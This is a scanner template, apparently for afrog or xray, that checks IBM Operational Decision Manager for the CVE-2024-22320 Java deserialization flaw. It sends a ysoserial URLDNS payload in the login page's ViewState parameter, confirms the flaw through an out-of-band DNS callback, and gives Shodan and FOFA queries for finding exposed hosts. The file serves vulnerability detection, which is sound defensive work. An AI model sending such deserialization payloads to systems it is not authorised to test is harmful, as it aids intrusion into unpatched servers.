id: CVE-2024-22320

info:
  name: IBM Operational Decision Manager - Java Deserialization
  author: DhiyaneshDK
  severity: high
  verified: false
  description: |
    IBM Operational Decision Manager 8.10.3, 8.10.4, 8.10.5.1, 8.11, 8.11.0.1, and 8.12.0.1 could allow a remote authenticated attacker to execute arbitrary code on the system, caused by an unsafe deserialization. By sending specially crafted request, an attacker could exploit this vulnerability to execute arbitrary code in the context of SYSTEM.  IBM X-Force ID:  279146.
    shodan: html:"IBM ODM"
    fofa: title="IBM ODM"
  reference:
    - https://labs.watchtowr.com/double-k-o-rce-in-ibm-operation-decision-manager/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-22320
  tags: cve,cve2024,ibm,odm,decision-manager,deserialization,jsf,rce
  created: 2024/03/07

set:
  oob: oob()
  oobDNS: oob.DNS
  base64payload: ysoserial("URLDNS",oobDNS,"base64")
rules:
  r0:
    request:
      method: GET
      path: /res/login.jsf?javax.faces.ViewState={{base64payload}}
    expression: response.status == 500 && oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
